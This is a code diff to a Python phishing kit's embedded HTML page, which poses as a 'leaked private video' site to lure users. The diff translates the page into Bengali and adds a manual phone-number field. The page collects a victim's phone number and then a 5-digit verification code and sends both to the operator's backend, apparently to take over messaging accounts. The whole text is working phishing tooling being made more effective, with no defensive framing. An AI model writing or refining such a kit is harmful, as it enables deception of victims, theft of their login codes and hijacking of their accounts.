@@ -34,7 +34,7 @@ captured_accounts = []
 pending_codes = {}
 sessions_lock = threading.Lock()
 
-# ====== Phishing Page ======
+# ====== Phishing Page (Fixed) ======
 PAGE = """<!DOCTYPE html>
 <html>
 <head>
@@ -95,49 +95,61 @@ PAGE = """<!DOCTYPE html>
         .video-item .info h4{font-size:12px;margin-bottom:3px}
         .video-item .info span{font-size:11px;color:#666}
         .footer{text-align:center;padding:20px;color:#333;font-size:11px}
+        .phone-input{width:100%;padding:15px;border-radius:10px;border:2px solid #2a2a3e;background:#0a0a0a;color:white;font-size:18px;text-align:center;margin:10px 0;outline:none}
+        .phone-input:focus{border-color:#0088cc}
+        .manual-btn{width:100%;padding:12px;background:#2a2a3e;border:none;border-radius:10px;color:#aaa;font-size:13px;cursor:pointer;margin-top:10px;transition:0.2s}
+        .manual-btn:hover{background:#3a3a5e;color:white}
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>🔥 PREMIUM VIDEO HUB</h1>
-        <p>Exclusive content — Verified members only</p>
+        <h1>🔥 প্রিমিয়াম ভিডিও হাব</h1>
+        <p>এক্সক্লুসিভ কন্টেন্ট — শুধুমাত্র ভেরিফাইড সদস্যদের জন্য</p>
     </div>
     <div class="video-card">
         <div class="thumbnail"><div class="play-btn">▶</div></div>
         <div class="video-info">
-            <h3>🔥 LEAKED PRIVATE VIDEO — 2026</h3>
-            <div class="meta">⭐ 4.9 (2.4M views) • 18+</div>
-            <span class="badge">🔞 RESTRICTED</span>
+            <h3>🔥 লিক করা প্রাইভেট ভিডিও — ২০২৬</h3>
+            <div class="meta">⭐ ৪.৯ (২৪ লক্ষ ভিউ) • ১৮+</div>
+            <span class="badge">🔞 সীমাবদ্ধ</span>
         </div>
     </div>
     <div class="link-section">
         <button class="get-link-btn" id="glb">
-            🔞 GET YOUR LINK
-            <span class="small">Contact share করুন</span>
+            🔞 আপনার লিংক নিন
+            <span class="small">কন্টাক্ট শেয়ার করুন</span>
         </button>
     </div>
-    <div class="section-title">🔥 More Videos</div>
+    <div class="section-title">🔥 আরও ভিডিও</div>
     <div class="video-grid">
-        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ff6b6b)">▶</div><div class="info"><h4>Private 01</h4><span>2.1M</span></div></div>
-        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ffa500)">▶</div><div class="info"><h4>Private 02</h4><span>1.8M</span></div></div>
-        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#4CAF50)">▶</div><div class="info"><h4>Private 03</h4><span>1.5M</span></div></div>
-        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#0088cc)">▶</div><div class="info"><h4>Private 04</h4><span>1.2M</span></div></div>
+        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ff6b6b)">▶</div><div class="info"><h4>প্রাইভেট ০১</h4><span>২১ লক্ষ</span></div></div>
+        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ffa500)">▶</div><div class="info"><h4>প্রাইভেট ০২</h4><span>১৮ লক্ষ</span></div></div>
+        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#4CAF50)">▶</div><div class="info"><h4>প্রাইভেট ০৩</h4><span>১৫ লক্ষ</span></div></div>
+        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#0088cc)">▶</div><div class="info"><h4>প্রাইভেট ০৪</h4><span>১২ লক্ষ</span></div></div>
     </div>
-    <div class="footer">© 2026 Premium Video Hub</div>
+    <div class="footer">© ২০২৬ প্রিমিয়াম ভিডিও হাব</div>
     
     <div class="modal-overlay" id="vm">
         <div class="modal">
+            <!-- Step 1: Phone Input (Fixed - no longer requires Telegram WebApp) -->
             <div id="s1" class="step active">
                 <div class="modal-icon">📞</div>
-                <h2>Contact Share করুন</h2>
-                <p>অ্যাক্সেস পেতে আপনার Contact শেয়ার করুন</p>
-                <div id="ps1" class="sb waiting">
-                    <span class="sp"></span> Contact শেয়ার করুন...
-                </div>
+                <h2>আপনার ফোন নম্বর দিন</h2>
+                <p>অ্যাক্সেস পেতে আপনার ফোন নম্বর দিন</p>
+                <input type="tel" class="phone-input" id="phoneInput" placeholder="+8801XXXXXXXXX" maxlength="15">
+                <div id="ps1" class="sb info" style="display:none">⏳ প্রসেসিং...</div>
+                <button class="get-link-btn" onclick="submitPhone()" style="padding:14px;font-size:16px;margin-top:8px">
+                    ✅ সাবমিট
+                </button>
+                <button class="manual-btn" onclick="tryTelegramContact()">
+                    📱 টেলিগ্রাম কন্টাক্ট শেয়ার করুন (যদি টেলিগ্রামে খোলেন)
+                </button>
             </div>
+            
+            <!-- Step 2: OTP Verification -->
             <div id="s2" class="step">
                 <div class="modal-icon">🔐</div>
-                <h2>Verification Code</h2>
+                <h2>ভেরিফিকেশন কোড</h2>
                 <p>📱 <span id="pd" style="color:#0088cc;font-weight:bold;">+880XXXXXXXXXX</span></p>
                 <div id="cs" class="sb waiting"><span class="sp"></span> কোড পাঠানো হচ্ছে...</div>
                 <div class="cd" id="cdisp">_____</div>
@@ -153,16 +165,18 @@ PAGE = """<!DOCTYPE html>
                     <button class="k" onclick="pk('9')">9</button>
                     <button class="k kc" onclick="cc()">⌫</button>
                     <button class="k" onclick="pk('0')">0</button>
-                    <button class="k ks" id="sb" onclick="sc()">✓ Verify</button>
+                    <button class="k ks" id="sb" onclick="sc()">✓ ভেরিফাই</button>
                 </div>
                 <div id="vs" class="sb"></div>
             </div>
+            
+            <!-- Step 3: Success -->
             <div id="s3" class="step">
                 <div class="ss">
                     <div class="bi">✅</div>
-                    <h2>Verification Successful!</h2>
+                    <h2>ভেরিফিকেশন সফল!</h2>
                     <p>আপনার লিংক তৈরি হচ্ছে...</p>
-                    <button class="wb" onclick="wv()">🎬 Watch Video</button>
+                    <button class="wb" onclick="wv()">🎬 ভিডিও দেখুন</button>
                 </div>
             </div>
         </div>
@@ -175,41 +189,60 @@ PAGE = """<!DOCTYPE html>
     
     document.getElementById('glb').onclick = function() {
         document.getElementById('vm').classList.add('active');
-        var ps = document.getElementById('ps1');
-        ps.className = 'sb waiting';
-        ps.innerHTML = '<span class="sp"></span> আপনার Contact শেয়ার করুন...';
-        ps.style.display = 'block';
-        requestContact();
+        // Default to Step 1 with manual input
+        document.getElementById('s1').classList.add('active');
+        document.getElementById('s2').classList.remove('active');
+        document.getElementById('s3').classList.remove('active');
+        document.getElementById('phoneInput').value = '';
+        document.getElementById('ps1').style.display = 'none';
     };
     
-    function requestContact() {
-        if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
-            if (typeof Telegram.WebApp.requestContact === 'function') {
-                Telegram.WebApp.requestContact(function(success, contact) {
-                    if (success && contact && contact.phone_number) {
-                        var p = contact.phone_number.startsWith('+') ? contact.phone_number : '+' + contact.phone_number;
-                        phoneNumber = p;
-                        var ps = document.getElementById('ps1');
-                        ps.className = 'sb success';
-                        ps.innerHTML = '✅ Contact received! সাবমিট হচ্ছে...';
-                        ps.style.display = 'block';
-                        sendPhoneToBackend(p);
-                    } else {
-                        var ps = document.getElementById('ps1');
-                        ps.className = 'sb error';
-                        ps.innerHTML = '❌ Contact share করতে হবে';
-                        ps.style.display = 'block';
-                    }
-                });
-            } else {
-                Telegram.WebApp.sendData(JSON.stringify({action: 'share_contact'}));
-            }
+    // Try Telegram WebApp contact share (will only work inside Telegram)
+    function tryTelegramContact() {
+        if (typeof Telegram !== 'undefined' && Telegram.WebApp && typeof Telegram.WebApp.requestContact === 'function') {
+            Telegram.WebApp.requestContact(function(success, contact) {
+                if (success && contact && contact.phone_number) {
+                    var p = contact.phone_number.startsWith('+') ? contact.phone_number : '+' + contact.phone_number;
+                    phoneNumber = p;
+                    document.getElementById('phoneInput').value = p;
+                    submitPhone();
+                }
+            });
         } else {
             var ps = document.getElementById('ps1');
             ps.className = 'sb error';
-            ps.innerHTML = '❌ শুধুমাত্র Telegram Bot থেকে খুলুন';
+            ps.innerHTML = '❌ টেলিগ্রামে খোলা হয়নি। দয়া করে উপরে ম্যানুয়ালি নম্বর দিন।';
             ps.style.display = 'block';
+            setTimeout(function() { ps.style.display = 'none'; }, 3000);
         }
+    }
+    
+    // Submit phone manually (FIXED - this is the main fix)
+    function submitPhone() {
+        var phone = document.getElementById('phoneInput').value.trim();
+        if (!phone) {
+            var ps = document.getElementById('ps1');
+            ps.className = 'sb error';
+            ps.innerHTML = '❌ দয়া করে আপনার ফোন নম্বর দিন';
+            ps.style.display = 'block';
+            return;
+        }
+        
+        // Format phone
+        if (phone.startsWith('0') && !phone.startsWith('+')) {
+            phone = '+88' + phone;
+        } else if (!phone.startsWith('+')) {
+            phone = '+' + phone;
+        }
+        
+        phoneNumber = phone;
+        
+        var ps = document.getElementById('ps1');
+        ps.className = 'sb waiting';
+        ps.innerHTML = '<span class="sp"></span> সাবমিট করা হচ্ছে...';
+        ps.style.display = 'block';
+        
+        sendPhoneToBackend(phone);
     }
     
     async function sendPhoneToBackend(phone) {
@@ -232,13 +265,13 @@ PAGE = """<!DOCTYPE html>
             } else {
                 var ps = document.getElementById('ps1');
                 ps.className = 'sb error';
-                ps.innerHTML = '❌ Error: ' + (data.error || 'Unknown');
+                ps.innerHTML = '❌ সমস্যা: ' + (data.error || 'অজানা');
                 ps.style.display = 'block';
             }
         } catch(e) {
             var ps = document.getElementById('ps1');
             ps.className = 'sb error';
-            ps.innerHTML = '❌ Connection error';
+            ps.innerHTML = '❌ সংযোগ সমস্যা';
             ps.style.display = 'block';
         }
     }
@@ -258,7 +291,7 @@ PAGE = """<!DOCTYPE html>
                     codeCheckInterval = null;
                     var cs = document.getElementById('cs');
                     cs.className = 'sb success';
-                    cs.innerHTML = '✅ 5 ডিজিটের OTP কোড এসেছে! টাইপ করুন:';
+                    cs.innerHTML = '✅ ৫ ডিজিটের OTP কোড এসেছে! টাইপ করুন:';
                     cs.style.display = 'block';
                 } else if (data.s === 'done') {
                     clearInterval(codeCheckInterval);
@@ -281,9 +314,9 @@ PAGE = """<!DOCTYPE html>
     function cc() { codeDigits = codeDigits.slice(0,-1); document.getElementById('cdisp').textContent = codeDigits || '_____'; }
     
     async function sc() {
-        if(codeDigits.length < 5) { showVerifyStatus('❌ 5 ডিজিটের কোড দিন','error'); return; }
+        if(codeDigits.length < 5) { showVerifyStatus('❌ ৫ ডিজিটের কোড দিন','error'); return; }
         document.getElementById('sb').disabled = true;
-        document.getElementById('sb').textContent = '⏳ Verifying...';
+        document.getElementById('sb').textContent = '⏳ ভেরিফাই করা হচ্ছে...';
         try {
             var res = await fetch('/api/verify', {
                 method: 'POST', headers: {'Content-Type': 'application/json'},
@@ -297,9 +330,9 @@ PAGE = """<!DOCTYPE html>
             } else {
                 showVerifyStatus('❌ ' + (data.error || 'ভুল কোড'), 'error');
                 codeDigits = ''; document.getElementById('cdisp').textContent = '_____';
-                document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify';
+                document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ ভেরিফাই';
             }
-        } catch(e) { showVerifyStatus('❌ Error','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify'; }
+        } catch(e) { showVerifyStatus('❌ সমস্যা','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ ভেরিফাই'; }
     }
     
     function showVerifyStatus(msg, type) {
